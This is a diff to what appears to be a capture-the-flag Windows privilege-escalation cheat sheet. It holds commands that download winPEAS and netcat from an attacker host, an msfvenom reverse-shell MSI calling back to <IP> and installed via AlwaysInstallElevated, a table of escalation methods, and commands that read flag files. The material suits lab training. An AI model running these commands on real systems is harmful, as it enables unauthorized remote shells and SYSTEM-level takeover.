@@ -81,5 +81,38 @@ systeminfo
 certutil -urlcache -f http://<IP>/winpeas.exe winpeas.exe
 Invoke-WebRequest http://<IP>/nc.exe -OutFile nc.exe
 ```
+---
+
+## 4. 🚀 Privilege Escalation Techniques
+
+| Method | Description |
+|--------|-------------|
+| AlwaysInstallElevated | Install MSI as SYSTEM |
+| Unquoted Service Path | Drop `.exe` in path |
+| DLL Hijacking | Replace a DLL |
+| Token Impersonation | JuicyPotato/PrintSpoofer |
+| Weak Service Permissions | Modify `binPath` |
+| Stored Passwords | `.rdp`, `.ini`, `.xml` |
+
+### 📦 AlwaysInstallElevated
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=PORT -f msi > shell.msi
+msiexec /quiet /qn /i shell.msi
+```
+
+### 🪟 Unquoted Path
+```powershell
+sc qc <vuln_service>
+```
+Drop payload to match unquoted path like `C:\Program Files\test.exe`
+
+---
+
+## 5. 🎯 Capture Proofs
+
+```powershell
+type C:\Users\<user>\Desktop\user.txt
+type C:\Users\Administrator\Desktop\root.txt
+```
 
 ---
